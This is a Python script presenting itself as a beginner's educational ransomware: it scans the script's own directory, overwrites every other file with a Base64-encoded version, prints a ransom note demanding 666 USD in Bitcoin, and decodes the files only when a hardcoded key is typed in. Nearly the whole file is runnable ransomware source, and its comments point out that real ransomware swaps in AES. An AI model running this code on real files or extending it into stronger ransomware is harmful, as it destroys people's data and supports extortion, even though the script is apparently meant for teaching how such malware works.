#!/usr/bin/env python3

"""
A simple, beginner-friendly implementation of ransomware in Python for educational purposes.
"""

import os
import sys
import base64
import logging
from typing import List

# --- Constants ---

# The key needed to decrypt the files. In a real scenario, the attacker
# would be the only one who knows this.
DECRYPTION_KEY = "fr33_my_f1l3s_n0w"

# List of files to ignore during encryption to avoid breaking the project itself.
EXCLUDED_FILES = ['ransomware.py', 'README.md'] # Updated to ransomware.py


class SimpleRansomware:
    """
    This class encapsulates the logic for a simple file-encrypting ransomware.
    Its purpose is to demonstrate the core concepts of how ransomware operates.
    """

    def __init__(self, name: str):
        self.name = name
        logging.info(f"Ransomware '{self.name}' initialized.")

    def find_target_files(self, root_path: str) -> List[str]:
        """
        Scans the given directory path and returns a list of files to be encrypted.

        It excludes the script itself and the README file.

        :param root_path: The directory to scan for files.
        :return: A list of full file paths to encrypt.
        """
        target_files = []
        for filename in os.listdir(root_path):
            # Check if the file is in our exclusion list.
            if filename in EXCLUDED_FILES or filename == os.path.basename(sys.argv[0]):
                logging.info(f"Skipping excluded file: {filename}")
                continue

            file_path = os.path.join(root_path, filename)
            # Ensure we only target files, not directories.
            if os.path.isfile(file_path):
                target_files.append(file_path)

        logging.info(f"Found {len(target_files)} target file(s).")
        return target_files

    def encrypt_file(self, file_path: str):
        """
        Encrypts a single file using Base64 encoding.

        NOTE: Base64 is NOT strong encryption. It's just an encoding to make binary
        data look like text. A real ransomware would use strong cryptographic
        algorithms like AES.

        :param file_path: The full path to the file to encrypt.
        """
        try:
            # Read the original content of the file.
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()

            # "Encrypt" the content using Base64.
            encoded_content = base64.b64encode(content.encode('utf-8'))

            # Overwrite the file with the encrypted content.
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(encoded_content.decode('utf-8'))

            logging.debug(f"Successfully encrypted: {file_path}")

        except Exception as e:
            logging.error(f"Failed to encrypt {file_path}: {e}")

    def decrypt_file(self, file_path: str):
        """
        Decrypts a single file that was encoded with Base64.

        :param file_path: The full path to the file to decrypt.
        """
        try:
            # Read the encrypted content.
            with open(file_path, 'r', encoding='utf-8') as f:
                encoded_content = f.read()

            # "Decrypt" the content by decoding it from Base64.
            decoded_content = base64.b64decode(encoded_content.encode('utf-8'))

            # Overwrite the file with the original, decrypted content.
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(decoded_content.decode('utf-8'))

            logging.debug(f"Successfully decrypted: {file_path}")

        except Exception as e:
            logging.error(f"Failed to decrypt {file_path}: {e}")


    def display_ransom_note(self):
        """Displays a message to the user informing them of the ransomware attack."""
        print("\n" + "="*50)
        print("Your files have been encrypted!")
        print("To get the decryption key, please send 666 USD in BTC to address XYZ.")
        print("="*50 + "\n")

    def prompt_for_decryption_key(self) -> str:
        """Asks the user to enter the decryption key."""
        return input("Please enter the decryption key to restore your files: ")

    def run_encryption_phase(self, path: str) -> int:
        """
        Finds and encrypts all target files in a directory.

        :param path: The directory to target.
        :return: The number of files that were encrypted.
        """
        target_files = self.find_target_files(path)
        for file_path in target_files:
            self.encrypt_file(file_path)

        if len(target_files) > 0:
            self.display_ransom_note()
        
        return len(target_files)

    def run_decryption_phase(self, path: str):
        """
        Prompts for a key and decrypts all target files if the key is correct.

        :param path: The directory to target.
        """
        user_key = self.prompt_for_decryption_key()

        if user_key == DECRYPTION_KEY:
            print("\nCorrect key. Decrypting files...")
            target_files = self.find_target_files(path)
            for file_path in target_files:
                self.decrypt_file(file_path)
            print("Decryption complete. Your files have been restored.")
        else:
            print("Wrong key! Files remain encrypted.")


# This is the main entry point of the script.
# The code inside this 'if' block will only run when you execute the script directly.
if __name__ == '__main__':
    # Configure logging to show debug messages.
    logging.basicConfig(level=logging.DEBUG, format='%(levelname)s:%(name)s:%(message)s')

    # Create an instance of our ransomware.
    ransomware = SimpleRansomware('BeginnerRansomware')

    # Define the target directory: the same directory where the script is located.
    current_directory = os.path.dirname(os.path.abspath(__file__))

    # --- Start of the simulation ---
    print("--- Ransomware Simulation START ---")
    
    # 1. Encrypt files in the current directory.
    num_encrypted = ransomware.run_encryption_phase(current_directory)
    print(f"\nNumber of files encrypted: {num_encrypted}")

    # If no files were encrypted, we can stop.
    if num_encrypted == 0:
        print("No target files found to encrypt. Exiting.")
    else:
        # 2. Start the decryption process (requires user interaction).
        ransomware.run_decryption_phase(current_directory)
    
    print("\n--- Ransomware Simulation END ---")
